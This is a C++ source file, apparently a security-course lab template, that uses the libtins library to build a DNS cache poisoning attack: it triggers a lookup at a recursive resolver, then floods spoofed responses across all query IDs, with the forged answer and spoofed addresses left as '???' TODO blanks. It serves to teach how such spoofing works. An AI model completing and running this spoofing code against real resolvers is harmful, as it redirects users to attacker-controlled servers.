#include <tins/tins.h>

using namespace Tins;

#define MAX_QUERY_ID 0xffff
#define MIN_QUERY_ID 0x0000

#define VICTIM_IP "192.168.1.2"
#define RECURSIVE_DNS "192.168.1.254"
#define AUTHORITATIVE_DNS "2.2.2.254"
#define COM_DNS "3.3.3.1"
#define ATTACKING_DOMAIN "example.com"
#define ATTACKING_HOST "foo.example.com"
#define MALICIOUS_NS "ns.attacker.com"
#define MALICIOUS_NS_IP "1.1.1.254"
#define MALICIOUS_WEBSERVER "1.1.1.3"

int main() {
    PacketSender sender;

    // Create the DNS query packet to send to the victim
    // That will trigger the recursive requests
    DNS dns_request;
    dns_request.type(DNS::QUERY);
    dns_request.id(1234);
    dns_request.recursion_desired(1);

    // IP of foo.example.com?
    DNS::query dns_query(ATTACKING_HOST, DNS::A, DNS::IN);
    dns_request.add_query(dns_query);

    // Send the packet
    IP query_pkt = IP(RECURSIVE_DNS, VICTIM_IP) / UDP(53, 1234) / dns_request;
    sender.send(query_pkt);

    // Try all possible query IDs
    for(unsigned int query_id = MIN_QUERY_ID; query_id < MAX_QUERY_ID; query_id++) {
        // Send a DNS response to the recursive DNS, coming from the <REDACTED>
        DNS dns_response;
        dns_response.type(DNS::RESPONSE);
        dns_response.id(query_id);
        dns_response.recursion_desired(1);
        dns_response.add_query(dns_query);

        /* 
         * TODO: put the first and second parameters inside the dns_answer.
         * Note that:
         * - the first parameter is the domain requested by the query
         * - the second parameter is the corresponding IP address
         */
        DNS::resource dns_answer("???", "???", DNS::A, DNS::IN, 259200);
        dns_response.add_answer(dns_answer);

        /* 
         * TODO: put the first and second parameters inside the IP packet.
         * Note that:
         * - the first parameter is the destination's IP address
         * - the second parameter is the source's IP address
         */
        IP resp_pkt = IP("???", "???") / UDP(33333, 53) / dns_response;
        sender.send(resp_pkt);
    }
}
